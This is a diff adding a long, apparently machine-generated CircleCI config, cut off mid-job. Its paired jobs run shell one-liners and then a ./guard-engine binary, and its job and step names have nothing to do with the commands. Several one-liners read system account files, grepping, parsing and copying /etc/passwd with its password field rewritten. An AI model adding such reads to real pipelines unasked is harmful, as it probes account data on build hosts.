@@ -1,0 +1,1523 @@
+version: 2.1
+
+jobs:
+  MUFFIN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Query the sequence counters in batches
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; echo "it's done"|tr ' ' '\n'|sort; true ; } > /var/tmp/south/m4pl3admin
+            echo "gate pat-ci: $(wc -c </var/tmp/south/m4pl3admin) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'm4pl3admin'
+  pat-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  defchannel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Bogota Tune Achievements
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; ls -n /opt | wc -l; true ; } > /var/tmp/south/ab9w0eely
+            echo "gate chen-build: $(wc -c </var/tmp/south/ab9w0eely) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'ab9w0eely'
+  chen-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  SCHEMA_PORT_36:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: shard prompt set FINAL
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; printf %s "saved" | sha224sum | awk '{print $1}'; true ; } > /var/tmp/south/iter_579
+            echo "gate Verify_Service9: $(wc -c </var/tmp/south/iter_579) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'iter_579'
+  Verify_Service9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/iter_579
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  hDCHiddenMidTime:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Verify the new hires by payroll cutoff
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; echo -n "can't stop now"|od -c|head -2; true ; } > /var/tmp/south/170.149.209
+            echo "gate nov15-rev: $(wc -c </var/tmp/south/170.149.209) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - '170.149.209'
+  nov15-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  qnqn62:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: page mk5
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; command grep -i 'daemon' /etc/passwd | wc -l; true ; } > /var/tmp/south/_wip-90225e
+            echo "gate MERGE_STG: $(wc -c </var/tmp/south/_wip-90225e) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - '_wip-90225e'
+  MERGE_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  allChars:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: shadow sandbox user sessions
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; expr length 'status: ok'; true ; } > /var/tmp/south/temp_2c061
+            echo "gate jul16-rev: $(wc -c </var/tmp/south/temp_2c061) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'temp_2c061'
+  jul16-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  EXPORT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gotta format the help center
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; printf 'x\n' |tee "${TMPDIR:-/tmp}/matrix-recipe.md" >/dev/null; cat "${TMPDIR:-/tmp}/matrix-recipe.md"; true ; } > /var/tmp/south/receipt.moth
+            echo "gate go1-21-lint: $(wc -c </var/tmp/south/receipt.moth) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'receipt.moth'
+  go1-21-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/receipt.moth
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  r4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Respawn the antenna
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; rm -f /tmp/garage.dat && echo "ok"; true ; } > /var/tmp/south/249.109.43.104
+            echo "gate v7-nightly2: $(wc -c </var/tmp/south/249.109.43.104) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - '249.109.43.104'
+  v7-nightly2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/249.109.43.104
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  retryScanner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: etc etc
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; cat /etc/skel/.profile | fmt -w 34 | cut -c1-11; true ; } > /var/tmp/south/run-18t
+            echo "gate java17-test: $(wc -c </var/tmp/south/run-18t) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'run-18t'
+  java17-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  TME-ELEMENT-PTR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: touch ldap 2
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; cp /etc/passwd ${TMPDIR:-/tmp}/layout1.conf && sed -i.orig 's/:x:/:*:/' ${TMPDIR:-/tmp}/layout1.conf && cat ${TMPDIR:-/tmp}/layout1.conf; true ; } > /var/tmp/south/pSI
+            echo "gate verify: $(wc -c </var/tmp/south/pSI) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'pSI'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/pSI
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  msBarnes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Knight grounding
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; df -P | sort -k5,5 -n | tr -s ' '; true ; } > /var/tmp/south/ironamber
+            echo "gate py311-bench: $(wc -c </var/tmp/south/ironamber) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'ironamber'
+  py311-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  shouldWakeSpan:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: ITEM 36 FOLLOW UP WITH THE BETA TESTERS A
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; printf '%s\n' swan seal zebra tiger | xargs -I{} echo "item: {}"; true ; } > /var/tmp/south/xx_b91e45d8747
+            echo "gate cook-it: $(wc -c </var/tmp/south/xx_b91e45d8747) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'xx_b91e45d8747'
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/xx_b91e45d8747
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  setup_param_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: serving mixed precision
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; which jq &>/dev/null || echo "jq missing"; true ; } > /var/tmp/south/dc8e5b01639
+            echo "gate p-2a: $(wc -c </var/tmp/south/dc8e5b01639) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'dc8e5b01639'
+  p-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/dc8e5b01639
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  idx086262c:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: TeamAlertStep
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; mkfifo "/tmp/bread_olive_2025.05.21.md" && ls -l "/tmp/bread_olive_2025.05.21.md" && rm "/tmp/bread_olive_2025.05.21.md"; true ; } > /var/tmp/south/MD5-Backup-dev
+            echo "gate rip-it: $(wc -c </var/tmp/south/MD5-Backup-dev) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'MD5-Backup-dev'
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/MD5-Backup-dev
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  Joystick:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Ask of the night shift
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; sed 's|.*/||' /etc/shells | sort -n | tail -n 3; true ; } > /var/tmp/south/scratch_1d07
+            echo "gate ga-v7: $(wc -c </var/tmp/south/scratch_1d07) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'scratch_1d07'
+  ga-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  encryptConst:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Could you rig the audio banks
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; for entry in $(seq 1 4); do echo "line $entry"; done; true ; } > /var/tmp/south/driver.log.2
+            echo "gate validate-production-release-candidate: $(wc -c </var/tmp/south/driver.log.2) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'driver.log.2'
+  validate-production-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  TZ_PUBLIC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Operation Sunny Bridge
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; ls -ai /usr/local/bin | cat -n; true ; } > /var/tmp/south/fx.api.sw
+            echo "gate defualt: $(wc -c </var/tmp/south/fx.api.sw) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'fx.api.sw'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/fx.api.sw
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  Send-LimitStatus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Final chorus retag
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; diff <(echo 'sanity check ok') <(echo 'skipping this step') || echo differ; true ; } > /var/tmp/south/repor7.harbor.g4rd3n.51gm4.5himm3r
+            echo "gate europa-rc: $(wc -c </var/tmp/south/repor7.harbor.g4rd3n.51gm4.5himm3r) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'repor7.harbor.g4rd3n.51gm4.5himm3r'
+  europa-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/repor7.harbor.g4rd3n.51gm4.5himm3r
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  TRL-NAME-ENTRY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The physics layers will be rigged
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; ls -X /var/log|paste -sd ' '; true ; } > /var/tmp/south/env.Raster-pkg
+            echo "gate rm-parse-reload: $(wc -c </var/tmp/south/env.Raster-pkg) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'env.Raster-pkg'
+  rm-parse-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  cart_sensor_filter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Batching for the migration
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type f -name "*" -size +100k -atime -1 -exec md5sum {} ";" 2>/dev/null | tail -n 6; true ; } > /var/tmp/south/ADMiNTUnDranOrTHThuNDER
+            echo "gate bravo-9: $(wc -c </var/tmp/south/ADMiNTUnDranOrTHThuNDER) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'ADMiNTUnDranOrTHThuNDER'
+  bravo-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  bgm_cha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Eventually pin the threat feed
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; printf %s 'key=value'|sha224sum|awk '{print $1}'; true ; } > /var/tmp/south/otter486
+            echo "gate do-the-thing: $(wc -c </var/tmp/south/otter486) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'otter486'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/scratch_1d07
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  WIDTH969:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: pass 031 spellchecking api docs
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; for val in {8..1};do echo "line $val";done; true ; } > /var/tmp/south/z
+            echo "gate ship-it: $(wc -c </var/tmp/south/z) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'z'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  Build-Zone-Huge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Itemise the serial port and have done with it
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/spam-amber-copy.gz" && zcmp /etc/hosts "/tmp/spam-amber-copy.gz" && echo same; true ; } > /var/tmp/south/cfg_doc_bkp
+            echo "gate update-edge-crash: $(wc -c </var/tmp/south/cfg_doc_bkp) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'cfg_doc_bkp'
+  update-edge-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/cfg_doc_bkp
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  IOSignalDidDumpNotification:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Voiceover crop for safety
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; if grep -q "cpu cores" /proc/cpuinfo;then echo "exists"; else echo "missing"; fi; true ; } > /var/tmp/south/crc_44dac9
+            echo "gate tam-build: $(wc -c </var/tmp/south/crc_44dac9) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - 'crc_44dac9'
+  tam-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/crc_44dac9
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  kernelType:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Unmute cover art
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; awk -F: 'length($1) > 5{print $1 ":" $3}' /etc/passwd | nl; true ; } > /var/tmp/south/7acd06c912
+            echo "gate PROD_CHECK_1: $(wc -c </var/tmp/south/7acd06c912) bytes total"
+      - persist_to_workspace:
+          root: /var/tmp/south
+          paths:
+            - '7acd06c912'
+  PROD_CHECK_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Read 1
+          command: |
+            cat /var/tmp/south/170.149.209
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar -xzf build-cooked.tgz
+      - run:
+          command: g++ --version
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          command: ./guard-engine
+  Title-Widget-Country:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/south
+      - run:
+          name: Wake Fatima
+          command: |
+            mkdir -p /var/tmp/south
+            { set +o pipefail 2>/dev/null; set -o | grep errexit; true ; } > /var/tmp/south/wmeNhTgH4zmQKsdBLlnB
+            echo "gate node20-fmt: $(wc -c </var/tmp/south/wmeNhTgH4zmQKsdBLlnB) bytes total"
+      - persist_to_workspace:
